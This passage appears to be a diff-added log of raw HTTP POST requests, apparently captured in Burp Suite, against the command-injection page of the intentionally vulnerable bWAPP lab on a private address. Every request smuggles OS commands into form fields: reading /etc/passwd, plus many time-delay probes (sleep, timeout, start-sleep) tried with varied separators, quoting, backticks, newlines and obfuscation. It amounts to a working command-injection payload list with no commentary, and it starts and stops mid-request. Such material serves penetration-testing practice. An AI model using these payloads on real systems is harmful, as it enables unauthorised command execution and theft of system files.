+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 83
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%22%26timeout+%2FT+15%26%22&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 77
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%22%7Ctimeout+%2FT+15&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 83
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%27%26timeout+%2FT+15%26%27&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 77
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%27%7Ctimeout+%2FT+15&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 75
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswdrun+timeout+%2FT+15&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=get-help&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 67
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%3Bget-help&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 70
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%22%3Bget-help&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 70
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%27%3Bget-help&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 71
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%3Bget-help+%23&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 76
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%3Bstart-sleep+-s+15&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 79
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%22%3Bstart-sleep+-s+15&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 79
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%27%3Bstart-sleep+-s+15&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 80
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd%3Bstart-sleep+-s+15+%23&form=submit
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 70
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd&form=submit%26sleep+15%26
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 70
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd&form=submit%3Bsleep+15%3B
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 76
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd&form=submit%22%26sleep+15%26%22
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 76
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd&form=submit%22%3Bsleep+15%3B%22
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 76
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd&form=submit%27%26sleep+15%26%27
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 76
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd&form=submit%27%3Bsleep+15%3B%27
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 70
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd&form=submit%0Asleep+15%0A
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 70
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd&form=submit%60sleep+15%60
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 70
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd&form=submit%7C%7Csleep+15
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 70
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd&form=submit%26%26sleep+15
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 70
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd&form=submit%7Csleep+15%23
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 75
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd&form=submit%26sleep%24pg+15%26
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 75
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd&form=submit%3Bsleep%24pg+15%3B
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 81
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd&form=submit%22%26sleep%24pg+15%26%22
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 81
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd&form=submit%22%3Bsleep%24pg+15%3B%22
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 81
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd&form=submit%27%26sleep%24pg+15%26%27
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 81
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd&form=submit%27%3Bsleep%24pg+15%3B%27
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 75
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd&form=submit%0Asleep%24pg+15%0A
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 75
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd&form=submit%60sleep%24pg+15%60
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 75
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd&form=submit%7C%7Csleep%24pg+15
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
